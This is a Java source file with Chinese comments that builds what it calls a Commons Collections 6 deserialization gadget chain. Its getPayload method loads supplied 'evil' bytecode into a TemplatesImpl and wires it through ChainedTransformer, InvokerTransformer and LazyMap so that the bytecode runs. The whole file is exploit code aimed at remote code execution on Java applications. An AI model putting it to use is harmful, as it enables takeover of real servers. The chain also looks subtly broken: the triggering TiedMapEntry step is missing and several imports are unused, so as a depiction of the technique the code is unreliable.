package gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Commons Collections 6 (CC6) 反序列化利用链
 */
public class CC6 {

    public static Object getPayload(byte[] evilByteCode, String evilClassPath) throws Exception {
        // 获取实际的字节数组
        byte[] actualByteCode = evilByteCode;
        if (actualByteCode == null && evilClassPath != null) {
            actualByteCode = loadBytesFromFile(evilClassPath);
        }

        if (actualByteCode == null) {
            throw new IllegalArgumentException("Either byte[] or String path must be provided");
        }

        // 创建TemplatesImpl实例
        TemplatesImpl templatesImpl = new TemplatesImpl();
        
        // 设置必要的字段
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{actualByteCode});
        setFieldValue(templatesImpl, "_name", "EvilClass");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 创建transformer链
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(templatesImpl),
            new InvokerTransformer("newTransformer", null, null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 创建HashMap和LazyMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        // 添加到hashMap中触发
        hashMap.put("yy", 1);

        return lazyMap;
    }

    /**
     * 从文件路径加载字节数组
     */
    private static byte[] loadBytesFromFile(String filePath) throws IOException {
        File file = new File(filePath);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        fis.read(bytes);
        fis.close();
        return bytes;
    }

    /**
     * 设置对象字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}